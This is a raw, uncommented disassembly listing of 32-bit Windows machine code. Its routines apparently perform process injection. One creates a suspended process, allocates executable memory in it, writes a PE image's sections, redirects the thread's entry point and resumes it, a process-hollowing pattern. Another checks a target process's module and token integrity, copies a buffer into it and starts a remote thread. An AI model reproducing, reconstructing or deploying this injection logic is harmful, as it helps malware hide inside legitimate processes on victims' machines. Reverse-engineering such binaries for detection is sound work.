  401ee3:	ff 15 1c f0 40 00    	call   *0x40f01c
  401ee9:	85 c0                	test   %eax,%eax
  401eeb:	0f 84 c7 00 00 00    	je     0x401fb8
  401ef1:	8b 44 24 08          	mov    0x8(%esp),%eax
  401ef5:	0f 57 c0             	xorps  %xmm0,%xmm0
  401ef8:	89 44 24 38          	mov    %eax,0x38(%esp)
  401efc:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401f00:	50                   	push   %eax
  401f01:	6a 00                	push   $0x0
  401f03:	8d 44 24 24          	lea    0x24(%esp),%eax
  401f07:	66 0f 13 44 24 30    	movlpd %xmm0,0x30(%esp)
  401f0d:	50                   	push   %eax
  401f0e:	6a 01                	push   $0x1
  401f10:	c7 44 24 2c ff 01 1f 	movl   $0x1f01ff,0x2c(%esp)
  401f17:	00 
  401f18:	c7 44 24 30 02 00 00 	movl   $0x2,0x30(%esp)
  401f1f:	00 
  401f20:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  401f27:	00 
  401f28:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%esp)
  401f2f:	00 
  401f30:	c7 44 24 44 05 00 00 	movl   $0x5,0x44(%esp)
  401f37:	00 
  401f38:	ff 15 24 f0 40 00    	call   *0x40f024
  401f3e:	85 c0                	test   %eax,%eax
  401f40:	75 76                	jne    0x401fb8
  401f42:	6a 14                	push   $0x14
  401f44:	6a 40                	push   $0x40
  401f46:	ff 15 98 f0 40 00    	call   *0x40f098
  401f4c:	8b f0                	mov    %eax,%esi
  401f4e:	85 f6                	test   %esi,%esi
  401f50:	74 66                	je     0x401fb8
  401f52:	6a 01                	push   $0x1
  401f54:	56                   	push   %esi
  401f55:	ff 15 34 f0 40 00    	call   *0x40f034
  401f5b:	85 c0                	test   %eax,%eax
  401f5d:	74 59                	je     0x401fb8
  401f5f:	6a 00                	push   $0x0
  401f61:	ff 74 24 10          	push   0x10(%esp)
  401f65:	6a 01                	push   $0x1
  401f67:	56                   	push   %esi
  401f68:	ff 15 04 f0 40 00    	call   *0x40f004
  401f6e:	85 c0                	test   %eax,%eax
  401f70:	74 46                	je     0x401fb8
  401f72:	8d 44 24 10          	lea    0x10(%esp),%eax
  401f76:	c7 44 24 10 0c 00 00 	movl   $0xc,0x10(%esp)
  401f7d:	00 
  401f7e:	50                   	push   %eax
  401f7f:	6a 00                	push   $0x0
  401f81:	68 00 04 00 00       	push   $0x400
  401f86:	68 00 04 00 00       	push   $0x400
  401f8b:	68 ff 00 00 00       	push   $0xff
  401f90:	6a 00                	push   $0x0
  401f92:	6a 03                	push   $0x3
  401f94:	57                   	push   %edi
  401f95:	89 74 24 34          	mov    %esi,0x34(%esp)
  401f99:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%esp)
  401fa0:	00 
  401fa1:	ff 15 e8 f0 40 00    	call   *0x40f0e8
  401fa7:	5f                   	pop    %edi
  401fa8:	5e                   	pop    %esi
  401fa9:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  401fad:	33 cc                	xor    %esp,%ecx
  401faf:	e8 91 17 00 00       	call   0x403745
  401fb4:	8b e5                	mov    %ebp,%esp
  401fb6:	5d                   	pop    %ebp
  401fb7:	c3                   	ret
  401fb8:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  401fbc:	83 c8 ff             	or     $0xffffffff,%eax
  401fbf:	5f                   	pop    %edi
  401fc0:	5e                   	pop    %esi
  401fc1:	33 cc                	xor    %esp,%ecx
  401fc3:	e8 7d 17 00 00       	call   0x403745
  401fc8:	8b e5                	mov    %ebp,%esp
  401fca:	5d                   	pop    %ebp
  401fcb:	c3                   	ret
  401fcc:	cc                   	int3
  401fcd:	cc                   	int3
  401fce:	cc                   	int3
  401fcf:	cc                   	int3
  401fd0:	55                   	push   %ebp
  401fd1:	8b ec                	mov    %esp,%ebp
  401fd3:	83 ec 6c             	sub    $0x6c,%esp
  401fd6:	a1 04 60 41 00       	mov    0x416004,%eax
  401fdb:	33 c5                	xor    %ebp,%eax
  401fdd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401fe0:	53                   	push   %ebx
  401fe1:	56                   	push   %esi
  401fe2:	57                   	push   %edi
  401fe3:	8b fa                	mov    %edx,%edi
  401fe5:	c7 45 98 00 00 00 00 	movl   $0x0,-0x68(%ebp)
  401fec:	8b d9                	mov    %ecx,%ebx
  401fee:	89 7d a4             	mov    %edi,-0x5c(%ebp)
  401ff1:	89 5d a0             	mov    %ebx,-0x60(%ebp)
  401ff4:	8b 77 3c             	mov    0x3c(%edi),%esi
  401ff7:	03 f7                	add    %edi,%esi
  401ff9:	81 3e 50 45 00 00    	cmpl   $0x4550,(%esi)
  401fff:	0f 85 60 01 00 00    	jne    0x402165
  402005:	6a 44                	push   $0x44
  402007:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40200a:	0f 57 c0             	xorps  %xmm0,%xmm0
  40200d:	6a 00                	push   $0x0
  40200f:	50                   	push   %eax
  402010:	0f 11 45 a8          	movups %xmm0,-0x58(%ebp)
  402014:	e8 77 2a 00 00       	call   0x404a90
  402019:	83 c4 0c             	add    $0xc,%esp
  40201c:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40201f:	50                   	push   %eax
  402020:	8d 45 b8             	lea    -0x48(%ebp),%eax
  402023:	50                   	push   %eax
  402024:	6a 00                	push   $0x0
  402026:	6a 00                	push   $0x0
  402028:	6a 04                	push   $0x4
  40202a:	6a 00                	push   $0x0
  40202c:	6a 00                	push   $0x0
  40202e:	6a 00                	push   $0x0
  402030:	6a 00                	push   $0x0
  402032:	53                   	push   %ebx
  402033:	ff 15 a0 f0 40 00    	call   *0x40f0a0
  402039:	85 c0                	test   %eax,%eax
  40203b:	0f 84 24 01 00 00    	je     0x402165
  402041:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402044:	6a 40                	push   $0x40
  402046:	68 00 30 00 00       	push   $0x3000
  40204b:	ff 76 50             	push   0x50(%esi)
  40204e:	89 45 94             	mov    %eax,-0x6c(%ebp)
  402051:	ff 76 34             	push   0x34(%esi)
  402054:	ff 75 a8             	push   -0x58(%ebp)
  402057:	ff 15 90 f0 40 00    	call   *0x40f090
  40205d:	8b d8                	mov    %eax,%ebx
  40205f:	89 5d 9c             	mov    %ebx,-0x64(%ebp)
  402062:	85 db                	test   %ebx,%ebx
  402064:	0f 84 d9 00 00 00    	je     0x402143
  40206a:	6a 00                	push   $0x0
  40206c:	ff 76 54             	push   0x54(%esi)
  40206f:	57                   	push   %edi
  402070:	53                   	push   %ebx
  402071:	ff 75 a8             	push   -0x58(%ebp)
  402074:	ff 15 fc f0 40 00    	call   *0x40f0fc
  40207a:	85 c0                	test   %eax,%eax
  40207c:	0f 84 c1 00 00 00    	je     0x402143
  402082:	33 c0                	xor    %eax,%eax
  402084:	33 ff                	xor    %edi,%edi
  402086:	66 3b 46 06          	cmp    0x6(%esi),%ax
  40208a:	73 40                	jae    0x4020cc
  40208c:	33 db                	xor    %ebx,%ebx
  40208e:	66 90                	xchg   %ax,%ax
  402090:	0f b7 4e 14          	movzwl 0x14(%esi),%ecx
  402094:	03 cb                	add    %ebx,%ecx
  402096:	6a 00                	push   $0x0
  402098:	ff 74 31 28          	push   0x28(%ecx,%esi,1)
  40209c:	8b 44 31 2c          	mov    0x2c(%ecx,%esi,1),%eax
  4020a0:	03 45 a4             	add    -0x5c(%ebp),%eax
  4020a3:	50                   	push   %eax
  4020a4:	8b 44 31 24          	mov    0x24(%ecx,%esi,1),%eax
  4020a8:	03 45 9c             	add    -0x64(%ebp),%eax
  4020ab:	50                   	push   %eax
  4020ac:	ff 75 a8             	push   -0x58(%ebp)
  4020af:	ff 15 fc f0 40 00    	call   *0x40f0fc
  4020b5:	85 c0                	test   %eax,%eax
  4020b7:	0f 84 83 00 00 00    	je     0x402140
  4020bd:	0f b7 46 06          	movzwl 0x6(%esi),%eax
  4020c1:	47                   	inc    %edi
  4020c2:	83 c3 28             	add    $0x28,%ebx
  4020c5:	3b f8                	cmp    %eax,%edi
  4020c7:	7c c7                	jl     0x402090
  4020c9:	8b 5d 9c             	mov    -0x64(%ebp),%ebx
  4020cc:	6a 04                	push   $0x4
  4020ce:	68 00 10 00 00       	push   $0x1000
  4020d3:	68 cc 02 00 00       	push   $0x2cc
  4020d8:	6a 00                	push   $0x0
  4020da:	ff 15 f0 f0 40 00    	call   *0x40f0f0
  4020e0:	8b f8                	mov    %eax,%edi
  4020e2:	85 ff                	test   %edi,%edi
  4020e4:	74 5a                	je     0x402140
  4020e6:	57                   	push   %edi
  4020e7:	c7 07 07 00 01 00    	movl   $0x10007,(%edi)
  4020ed:	ff 75 ac             	push   -0x54(%ebp)
  4020f0:	ff 15 88 f0 40 00    	call   *0x40f088
  4020f6:	85 c0                	test   %eax,%eax
  4020f8:	74 46                	je     0x402140
  4020fa:	6a 00                	push   $0x0
  4020fc:	6a 04                	push   $0x4
  4020fe:	8d 46 34             	lea    0x34(%esi),%eax
  402101:	50                   	push   %eax
  402102:	8b 87 a4 00 00 00    	mov    0xa4(%edi),%eax
  402108:	83 c0 08             	add    $0x8,%eax
  40210b:	50                   	push   %eax
  40210c:	ff 75 a8             	push   -0x58(%ebp)
  40210f:	ff 15 fc f0 40 00    	call   *0x40f0fc
  402115:	85 c0                	test   %eax,%eax
  402117:	74 27                	je     0x402140
  402119:	8b 46 28             	mov    0x28(%esi),%eax
  40211c:	03 c3                	add    %ebx,%eax
  40211e:	57                   	push   %edi
  40211f:	89 87 b0 00 00 00    	mov    %eax,0xb0(%edi)
  402125:	ff 75 ac             	push   -0x54(%ebp)
  402128:	ff 15 c4 f0 40 00    	call   *0x40f0c4
  40212e:	85 c0                	test   %eax,%eax
  402130:	74 0e                	je     0x402140
  402132:	ff 75 ac             	push   -0x54(%ebp)
  402135:	ff 15 5c f0 40 00    	call   *0x40f05c
  40213b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40213e:	75 48                	jne    0x402188
  402140:	8b 7d a4             	mov    -0x5c(%ebp),%edi
  402143:	8b 45 94             	mov    -0x6c(%ebp),%eax
  402146:	85 c0                	test   %eax,%eax
  402148:	74 18                	je     0x402162
  40214a:	50                   	push   %eax
  40214b:	6a 00                	push   $0x0
  40214d:	6a 01                	push   $0x1
  40214f:	ff 15 68 f0 40 00    	call   *0x40f068
  402155:	85 c0                	test   %eax,%eax
  402157:	74 09                	je     0x402162
  402159:	6a 00                	push   $0x0
  40215b:	50                   	push   %eax
  40215c:	ff 15 ec f0 40 00    	call   *0x40f0ec
  402162:	8b 5d a0             	mov    -0x60(%ebp),%ebx
  402165:	8b 75 98             	mov    -0x68(%ebp),%esi
  402168:	46                   	inc    %esi
  402169:	89 75 98             	mov    %esi,-0x68(%ebp)
  40216c:	83 fe 05             	cmp    $0x5,%esi
  40216f:	0f 82 7f fe ff ff    	jb     0x401ff4
  402175:	5f                   	pop    %edi
  402176:	5e                   	pop    %esi
  402177:	33 c0                	xor    %eax,%eax
  402179:	5b                   	pop    %ebx
  40217a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40217d:	33 cd                	xor    %ebp,%ecx
  40217f:	e8 c1 15 00 00       	call   0x403745
  402184:	8b e5                	mov    %ebp,%esp
  402186:	5d                   	pop    %ebp
  402187:	c3                   	ret
  402188:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40218b:	b8 01 00 00 00       	mov    $0x1,%eax
  402190:	5f                   	pop    %edi
  402191:	5e                   	pop    %esi
  402192:	33 cd                	xor    %ebp,%ecx
  402194:	5b                   	pop    %ebx
  402195:	e8 ab 15 00 00       	call   0x403745
  40219a:	8b e5                	mov    %ebp,%esp
  40219c:	5d                   	pop    %ebp
  40219d:	c3                   	ret
  40219e:	cc                   	int3
  40219f:	cc                   	int3
  4021a0:	55                   	push   %ebp
  4021a1:	8b ec                	mov    %esp,%ebp
  4021a3:	81 ec 44 04 00 00    	sub    $0x444,%esp
  4021a9:	a1 04 60 41 00       	mov    0x416004,%eax
  4021ae:	33 c5                	xor    %ebp,%eax
  4021b0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4021b3:	a1 10 73 41 00       	mov    0x417310,%eax
  4021b8:	53                   	push   %ebx
  4021b9:	8b 1d 14 73 41 00    	mov    0x417314,%ebx
  4021bf:	56                   	push   %esi
  4021c0:	57                   	push   %edi
  4021c1:	89 85 c8 fb ff ff    	mov    %eax,-0x438(%ebp)
  4021c7:	8b f9                	mov    %ecx,%edi
  4021c9:	8d 85 d4 fb ff ff    	lea    -0x42c(%ebp),%eax
  4021cf:	89 bd d8 fb ff ff    	mov    %edi,-0x428(%ebp)
  4021d5:	33 f6                	xor    %esi,%esi
  4021d7:	50                   	push   %eax
  4021d8:	89 b5 cc fb ff ff    	mov    %esi,-0x434(%ebp)
  4021de:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  4021e4:	50                   	push   %eax
  4021e5:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  4021eb:	85 c0                	test   %eax,%eax
  4021ed:	a1 68 f0 40 00       	mov    0x40f068,%eax
  4021f2:	0f 84 96 00 00 00    	je     0x40228e
  4021f8:	39 b5 d4 fb ff ff    	cmp    %esi,-0x42c(%ebp)
  4021fe:	0f 84 8a 00 00 00    	je     0x40228e
  402204:	57                   	push   %edi
  402205:	56                   	push   %esi
  402206:	68 00 10 00 00       	push   $0x1000
  40220b:	ff d0                	call   *%eax
  40220d:	89 85 dc fb ff ff    	mov    %eax,-0x424(%ebp)
  402213:	85 c0                	test   %eax,%eax
  402215:	74 51                	je     0x402268
  402217:	8d 8d e0 fb ff ff    	lea    -0x420(%ebp),%ecx
  40221d:	51                   	push   %ecx
  40221e:	50                   	push   %eax
  40221f:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  402225:	85 c0                	test   %eax,%eax
  402227:	74 2b                	je     0x402254
  402229:	ff b5 dc fb ff ff    	push   -0x424(%ebp)
  40222f:	33 c0                	xor    %eax,%eax
  402231:	c7 85 cc fb ff ff 01 	movl   $0x1,-0x434(%ebp)
  402238:	00 00 00 
  40223b:	39 85 e0 fb ff ff    	cmp    %eax,-0x420(%ebp)
  402241:	0f 94 c0             	sete   %al
  402244:	89 85 d0 fb ff ff    	mov    %eax,-0x430(%ebp)
  40224a:	8b f8                	mov    %eax,%edi
  40224c:	ff 15 18 f1 40 00    	call   *0x40f118
  402252:	eb 1a                	jmp    0x40226e
  402254:	ff b5 dc fb ff ff    	push   -0x424(%ebp)
  40225a:	8b bd dc fb ff ff    	mov    -0x424(%ebp),%edi
  402260:	ff 15 18 f1 40 00    	call   *0x40f118
  402266:	eb 06                	jmp    0x40226e
  402268:	8b bd dc fb ff ff    	mov    -0x424(%ebp),%edi
  40226e:	39 b5 cc fb ff ff    	cmp    %esi,-0x434(%ebp)
  402274:	0f 84 a7 02 00 00    	je     0x402521
  40227a:	83 ff 01             	cmp    $0x1,%edi
  40227d:	0f 84 9e 02 00 00    	je     0x402521
  402283:	8b bd d8 fb ff ff    	mov    -0x428(%ebp),%edi
  402289:	a1 68 f0 40 00       	mov    0x40f068,%eax
  40228e:	57                   	push   %edi
  40228f:	6a 00                	push   $0x0
  402291:	68 3a 04 00 00       	push   $0x43a
  402296:	ff d0                	call   *%eax
  402298:	89 85 cc fb ff ff    	mov    %eax,-0x434(%ebp)
  40229e:	85 c0                	test   %eax,%eax
  4022a0:	0f 84 7b 02 00 00    	je     0x402521
  4022a6:	57                   	push   %edi
  4022a7:	6a 00                	push   $0x0
  4022a9:	68 10 04 00 00       	push   $0x410
  4022ae:	89 b5 e0 fb ff ff    	mov    %esi,-0x420(%ebp)
  4022b4:	ff 15 68 f0 40 00    	call   *0x40f068
  4022ba:	8b f0                	mov    %eax,%esi
  4022bc:	85 f6                	test   %esi,%esi
  4022be:	0f 84 aa 00 00 00    	je     0x40236e
  4022c4:	68 04 01 00 00       	push   $0x104
  4022c9:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  4022cf:	50                   	push   %eax
  4022d0:	6a 00                	push   $0x0
  4022d2:	56                   	push   %esi
  4022d3:	ff 15 e4 f0 40 00    	call   *0x40f0e4
  4022d9:	85 c0                	test   %eax,%eax
  4022db:	74 35                	je     0x402312
  4022dd:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  4022e3:	50                   	push   %eax
  4022e4:	ff 15 04 f2 40 00    	call   *0x40f204
  4022ea:	8b f8                	mov    %eax,%edi
  4022ec:	57                   	push   %edi
  4022ed:	ff 15 28 f1 40 00    	call   *0x40f128
  4022f3:	3d 04 01 00 00       	cmp    $0x104,%eax
  4022f8:	77 18                	ja     0x402312
  4022fa:	57                   	push   %edi
  4022fb:	8d 85 e4 fb ff ff    	lea    -0x41c(%ebp),%eax
  402301:	50                   	push   %eax
  402302:	ff 15 b0 f0 40 00    	call   *0x40f0b0
  402308:	c7 85 e0 fb ff ff 01 	movl   $0x1,-0x420(%ebp)
  40230f:	00 00 00 
  402312:	56                   	push   %esi
  402313:	ff 15 18 f1 40 00    	call   *0x40f118
  402319:	83 bd e0 fb ff ff 00 	cmpl   $0x0,-0x420(%ebp)
  402320:	74 4c                	je     0x40236e
  402322:	8b 3d c8 f0 40 00    	mov    0x40f0c8,%edi
  402328:	33 f6                	xor    %esi,%esi
  40232a:	c7 85 bc fb ff ff 28 	movl   $0x413f28,-0x444(%ebp)
  402331:	3f 41 00 
  402334:	c7 85 c0 fb ff ff 40 	movl   $0x413f40,-0x440(%ebp)
  40233b:	3f 41 00 
  40233e:	c7 85 c4 fb ff ff 5c 	movl   $0x413f5c,-0x43c(%ebp)
  402345:	3f 41 00 
  402348:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  40234f:	00 
  402350:	ff b4 b5 bc fb ff ff 	push   -0x444(%ebp,%esi,4)
  402357:	8d 85 e4 fb ff ff    	lea    -0x41c(%ebp),%eax
  40235d:	50                   	push   %eax
  40235e:	ff d7                	call   *%edi
  402360:	85 c0                	test   %eax,%eax
  402362:	0f 84 ab 01 00 00    	je     0x402513
  402368:	46                   	inc    %esi
  402369:	83 fe 03             	cmp    $0x3,%esi
  40236c:	72 e2                	jb     0x402350
  40236e:	8b b5 cc fb ff ff    	mov    -0x434(%ebp),%esi
  402374:	8d 85 d8 fb ff ff    	lea    -0x428(%ebp),%eax
  40237a:	6a 00                	push   $0x0
  40237c:	6a 04                	push   $0x4
  40237e:	50                   	push   %eax
  40237f:	6a 1d                	push   $0x1d
  402381:	56                   	push   %esi
  402382:	ff 15 0c f2 40 00    	call   *0x40f20c
  402388:	85 c0                	test   %eax,%eax
  40238a:	0f 88 83 01 00 00    	js     0x402513
  402390:	83 bd d8 fb ff ff 00 	cmpl   $0x0,-0x428(%ebp)
  402397:	0f 85 76 01 00 00    	jne    0x402513
  40239d:	8d 85 e0 fb ff ff    	lea    -0x420(%ebp),%eax
  4023a3:	c7 85 d4 fb ff ff 00 	movl   $0x0,-0x42c(%ebp)
  4023aa:	00 00 00 
  4023ad:	50                   	push   %eax
  4023ae:	6a 08                	push   $0x8
  4023b0:	56                   	push   %esi
  4023b1:	ff 15 30 f0 40 00    	call   *0x40f030
  4023b7:	85 c0                	test   %eax,%eax
  4023b9:	0f 84 54 01 00 00    	je     0x402513
  4023bf:	8b 3d 40 f0 40 00    	mov    0x40f040,%edi
  4023c5:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
  4023cb:	50                   	push   %eax
  4023cc:	6a 00                	push   $0x0
  4023ce:	6a 00                	push   $0x0
  4023d0:	6a 19                	push   $0x19
  4023d2:	ff b5 e0 fb ff ff    	push   -0x420(%ebp)
  4023d8:	ff d7                	call   *%edi
  4023da:	85 c0                	test   %eax,%eax
  4023dc:	75 74                	jne    0x402452
  4023de:	ff 15 70 f0 40 00    	call   *0x40f070
  4023e4:	83 f8 7a             	cmp    $0x7a,%eax
  4023e7:	75 69                	jne    0x402452
  4023e9:	ff b5 d0 fb ff ff    	push   -0x430(%ebp)
  4023ef:	6a 00                	push   $0x0
  4023f1:	ff 15 98 f0 40 00    	call   *0x40f098
  4023f7:	8b f0                	mov    %eax,%esi
  4023f9:	85 f6                	test   %esi,%esi
  4023fb:	74 55                	je     0x402452
  4023fd:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
  402403:	50                   	push   %eax
  402404:	ff b5 d0 fb ff ff    	push   -0x430(%ebp)
  40240a:	56                   	push   %esi
  40240b:	6a 19                	push   $0x19
  40240d:	ff b5 e0 fb ff ff    	push   -0x420(%ebp)
  402413:	ff d7                	call   *%edi
  402415:	85 c0                	test   %eax,%eax
  402417:	74 2a                	je     0x402443
  402419:	ff 36                	push   (%esi)
  40241b:	ff 15 14 f0 40 00    	call   *0x40f014
  402421:	0f b6 00             	movzbl (%eax),%eax
  402424:	48                   	dec    %eax
  402425:	50                   	push   %eax
  402426:	ff 36                	push   (%esi)
  402428:	ff 15 20 f0 40 00    	call   *0x40f020
  40242e:	56                   	push   %esi
  40242f:	c7 85 d4 fb ff ff 01 	movl   $0x1,-0x42c(%ebp)
  402436:	00 00 00 
  402439:	8b 38                	mov    (%eax),%edi
  40243b:	ff 15 94 f0 40 00    	call   *0x40f094
  402441:	eb 15                	jmp    0x402458
  402443:	8b bd d8 fb ff ff    	mov    -0x428(%ebp),%edi
  402449:	56                   	push   %esi
  40244a:	ff 15 94 f0 40 00    	call   *0x40f094
  402450:	eb 06                	jmp    0x402458
  402452:	8b bd d8 fb ff ff    	mov    -0x428(%ebp),%edi
  402458:	ff b5 e0 fb ff ff    	push   -0x420(%ebp)
  40245e:	ff 15 18 f1 40 00    	call   *0x40f118
  402464:	83 bd d4 fb ff ff 00 	cmpl   $0x0,-0x42c(%ebp)
  40246b:	0f 84 a2 00 00 00    	je     0x402513
  402471:	81 ff 00 20 00 00    	cmp    $0x2000,%edi
  402477:	0f 82 96 00 00 00    	jb     0x402513
  40247d:	8b 43 3c             	mov    0x3c(%ebx),%eax
  402480:	81 3c 18 50 45 00 00 	cmpl   $0x4550,(%eax,%ebx,1)
  402487:	0f 85 86 00 00 00    	jne    0x402513
  40248d:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  402492:	66 39 4c 18 18       	cmp    %cx,0x18(%eax,%ebx,1)
  402497:	75 7a                	jne    0x402513
  402499:	8b 54 18 78          	mov    0x78(%eax,%ebx,1),%edx
  40249d:	8b cb                	mov    %ebx,%ecx
  40249f:	e8 dc 01 00 00       	call   0x402680
  4024a4:	8b 54 03 20          	mov    0x20(%ebx,%eax,1),%edx
  4024a8:	8b cb                	mov    %ebx,%ecx
  4024aa:	8d 34 03             	lea    (%ebx,%eax,1),%esi
  4024ad:	89 b5 e0 fb ff ff    	mov    %esi,-0x420(%ebp)
  4024b3:	e8 c8 01 00 00       	call   0x402680
  4024b8:	8b 56 24             	mov    0x24(%esi),%edx
  4024bb:	8b cb                	mov    %ebx,%ecx
  4024bd:	8d 3c 03             	lea    (%ebx,%eax,1),%edi
  4024c0:	e8 bb 01 00 00       	call   0x402680
  4024c5:	03 c3                	add    %ebx,%eax
  4024c7:	33 f6                	xor    %esi,%esi
  4024c9:	89 85 d0 fb ff ff    	mov    %eax,-0x430(%ebp)
  4024cf:	8b 85 e0 fb ff ff    	mov    -0x420(%ebp),%eax
  4024d5:	39 70 18             	cmp    %esi,0x18(%eax)
  4024d8:	76 39                	jbe    0x402513
  4024da:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  4024e0:	8b 17                	mov    (%edi),%edx
  4024e2:	8b cb                	mov    %ebx,%ecx
  4024e4:	e8 97 01 00 00       	call   0x402680
  4024e9:	03 c3                	add    %ebx,%eax
  4024eb:	68 b4 3e 41 00       	push   $0x413eb4
  4024f0:	50                   	push   %eax
  4024f1:	e8 4a 1f 00 00       	call   0x404440
  4024f6:	83 c4 08             	add    $0x8,%esp
  4024f9:	85 c0                	test   %eax,%eax
  4024fb:	8b 85 e0 fb ff ff    	mov    -0x420(%ebp),%eax
  402501:	75 31                	jne    0x402534
  402503:	83 85 d0 fb ff ff 02 	addl   $0x2,-0x430(%ebp)
  40250a:	46                   	inc    %esi
  40250b:	83 c7 04             	add    $0x4,%edi
  40250e:	3b 70 18             	cmp    0x18(%eax),%esi
  402511:	72 cd                	jb     0x4024e0
  402513:	33 f6                	xor    %esi,%esi
  402515:	ff b5 cc fb ff ff    	push   -0x434(%ebp)
  40251b:	ff 15 18 f1 40 00    	call   *0x40f118
  402521:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402524:	8b c6                	mov    %esi,%eax
  402526:	5f                   	pop    %edi
  402527:	5e                   	pop    %esi
  402528:	33 cd                	xor    %ebp,%ecx
  40252a:	5b                   	pop    %ebx
  40252b:	e8 15 12 00 00       	call   0x403745
  402530:	8b e5                	mov    %ebp,%esp
  402532:	5d                   	pop    %ebp
  402533:	c3                   	ret
  402534:	8b 50 1c             	mov    0x1c(%eax),%edx
  402537:	8b cb                	mov    %ebx,%ecx
  402539:	e8 42 01 00 00       	call   0x402680
  40253e:	8b 8d d0 fb ff ff    	mov    -0x430(%ebp),%ecx
  402544:	03 c3                	add    %ebx,%eax
  402546:	0f b7 11             	movzwl (%ecx),%edx
  402549:	8b cb                	mov    %ebx,%ecx
  40254b:	8b 14 90             	mov    (%eax,%edx,4),%edx
  40254e:	e8 2d 01 00 00       	call   0x402680
  402553:	89 85 dc fb ff ff    	mov    %eax,-0x424(%ebp)
  402559:	85 c0                	test   %eax,%eax
  40255b:	74 b6                	je     0x402513
  40255d:	8b b5 cc fb ff ff    	mov    -0x434(%ebp),%esi
  402563:	6a 40                	push   $0x40
  402565:	68 00 30 00 00       	push   $0x3000
  40256a:	ff b5 c8 fb ff ff    	push   -0x438(%ebp)
  402570:	6a 00                	push   $0x0
  402572:	56                   	push   %esi
  402573:	ff 15 90 f0 40 00    	call   *0x40f090
  402579:	8b f8                	mov    %eax,%edi
  40257b:	85 ff                	test   %edi,%edi
  40257d:	74 94                	je     0x402513
  40257f:	6a 00                	push   $0x0
  402581:	ff b5 c8 fb ff ff    	push   -0x438(%ebp)
  402587:	53                   	push   %ebx
  402588:	57                   	push   %edi
  402589:	56                   	push   %esi
  40258a:	ff 15 fc f0 40 00    	call   *0x40f0fc
  402590:	85 c0                	test   %eax,%eax
  402592:	0f 84 7b ff ff ff    	je     0x402513
  402598:	68 d8 40 41 00       	push   $0x4140d8
  40259d:	c7 85 d0 fb ff ff 00 	movl   $0x0,-0x430(%ebp)
  4025a4:	00 00 00 
  4025a7:	ff 15 60 f0 40 00    	call   *0x40f060
  4025ad:	85 c0                	test   %eax,%eax
  4025af:	74 10                	je     0x4025c1
  4025b1:	68 e4 40 41 00       	push   $0x4140e4
  4025b6:	50                   	push   %eax
  4025b7:	ff 15 8c f0 40 00    	call   *0x40f08c
  4025bd:	8b c8                	mov    %eax,%ecx
  4025bf:	eb 02                	jmp    0x4025c3
  4025c1:	33 c9                	xor    %ecx,%ecx
  4025c3:	8b 85 dc fb ff ff    	mov    -0x424(%ebp),%eax
  4025c9:	6a 00                	push   $0x0
  4025cb:	6a 00                	push   $0x0
  4025cd:	6a 00                	push   $0x0
  4025cf:	6a 00                	push   $0x0
  4025d1:	6a 00                	push   $0x0
  4025d3:	57                   	push   %edi
  4025d4:	03 c7                	add    %edi,%eax
  4025d6:	50                   	push   %eax
  4025d7:	56                   	push   %esi
  4025d8:	6a 00                	push   $0x0
  4025da:	68 ff ff 1f 00       	push   $0x1fffff
  4025df:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
  4025e5:	50                   	push   %eax
  4025e6:	ff d1                	call   *%ecx
  4025e8:	85 c0                	test   %eax,%eax
  4025ea:	0f 88 23 ff ff ff    	js     0x402513
  4025f0:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  4025f6:	85 c0                	test   %eax,%eax
  4025f8:	0f 84 15 ff ff ff    	je     0x402513
  4025fe:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  402602:	74 11                	je     0x402615
  402604:	50                   	push   %eax
  402605:	be 01 00 00 00       	mov    $0x1,%esi
  40260a:	ff 15 18 f1 40 00    	call   *0x40f118
  402610:	e9 00 ff ff ff       	jmp    0x402515
  402615:	6a 64                	push   $0x64
  402617:	50                   	push   %eax
  402618:	ff 15 dc f0 40 00    	call   *0x40f0dc
  40261e:	85 c0                	test   %eax,%eax
  402620:	75 3c                	jne    0x40265e
  402622:	8d 85 dc fb ff ff    	lea    -0x424(%ebp),%eax
  402628:	50                   	push   %eax
  402629:	ff b5 d0 fb ff ff    	push   -0x430(%ebp)
  40262f:	ff 15 6c f0 40 00    	call   *0x40f06c
  402635:	85 c0                	test   %eax,%eax
  402637:	74 25                	je     0x40265e
  402639:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  40263f:	33 db                	xor    %ebx,%ebx
  402641:	39 9d dc fb ff ff    	cmp    %ebx,-0x424(%ebp)
  402647:	50                   	push   %eax
  402648:	0f 95 c3             	setne  %bl
  40264b:	89 9d dc fb ff ff    	mov    %ebx,-0x424(%ebp)
  402651:	8b f3                	mov    %ebx,%esi
  402653:	ff 15 18 f1 40 00    	call   *0x40f118
  402659:	e9 b7 fe ff ff       	jmp    0x402515
  40265e:	8b 85 d0 fb ff ff    	mov    -0x430(%ebp),%eax
  402664:	33 f6                	xor    %esi,%esi
  402666:	50                   	push   %eax
  402667:	ff 15 18 f1 40 00    	call   *0x40f118
  40266d:	e9 a3 fe ff ff       	jmp    0x402515
  402672:	cc                   	int3
  402673:	cc                   	int3
  402674:	cc                   	int3
  402675:	cc                   	int3
  402676:	cc                   	int3
  402677:	cc                   	int3
  402678:	cc                   	int3
